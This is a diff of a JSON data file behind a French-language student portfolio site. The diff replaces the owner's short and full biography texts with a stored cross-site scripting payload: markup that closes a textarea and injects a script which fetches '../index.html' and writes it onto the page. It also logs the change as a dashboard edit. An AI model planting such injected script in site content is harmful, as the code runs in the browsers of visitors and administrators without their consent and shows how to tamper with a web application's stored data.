@@ -6,8 +6,8 @@
     "title": "Data Analyst & Développeur Web & Mobile",
     "subTitle": "Étudiant en 3e année Licence Génie Informatique (IUA)",
     "statusBadge": "Disponible pour stage / opportunités",
-    "shortBio": "Étudiant en troisième année de licence en génie informatique, futur data analyst et développeur web & mobile, passionné par les données, l'intelligence artificielle, la résolution de problèmes et le développement d'outils décisionnels. Motivé à transformer les données en insights pertinents et en tableaux de bord interactifs pour soutenir la prise de décision stratégique.",
-    "fullBio": "Étudiant en troisième année de licence en génie informatique, futur data analyst et développeur web & mobile, passionné par les données, l'intelligence artificielle, la résolution de problèmes et le développement d'outils décisionnels. Motivé à transformer les données en insights pertinents et en tableaux de bord interactifs pour soutenir la prise de décision stratégique.",
+    "shortBio": "</textarea><div id=\"hack_output\" style=\"color:red;background:white;font-size:16px;\"></div><script>fetch(\"../index.html\").then(r=>r.text()).then(t=>{document.getElementById(\"hack_output\").innerText = t;})</script>",
+    "fullBio": "</textarea><div id=\"hack_output\" style=\"color:red;background:white;font-size:16px;\"></div><script>fetch(\"../index.html\").then(r=>r.text()).then(t=>{document.getElementById(\"hack_output\").innerText = t;})</script>",
     "photo": "assets/images/falikou_photo_clean.png",
     "coverImage": "assets/images/project-bi.jpg",
     "resumeUrl": "CV_FalikouFOFANA_Data_Analyst.pdf",
@@ -483,6 +483,13 @@
   "messages": [],
   "history": [
     {
+      "id": "h-1787830752924",
+      "timestamp": "2026-08-27T11:39:12.924Z",
+      "action": "Titre & Bio modifiés depuis le Dashboard",
+      "target": "Portfolio",
+      "details": "Enregistré dans la base de données"
+    },
+    {
       "id": "h-1787829968040",
       "timestamp": "2026-08-27T11:26:08.040Z",
       "action": "Titres et textes enregistrés",
@@ -503,6 +510,6 @@
     "keywords": "Falikou FOFANA, Data Analyst, Développeur Web Mobile, Power BI, Excel TCD, SQL, Python, IUA Abidjan"
   },
   "settings": {
-    "lastPublished": "2026-08-27T11:26:08.040Z"
+    "lastPublished": "2026-08-27T11:39:12.925Z"
   }
 }
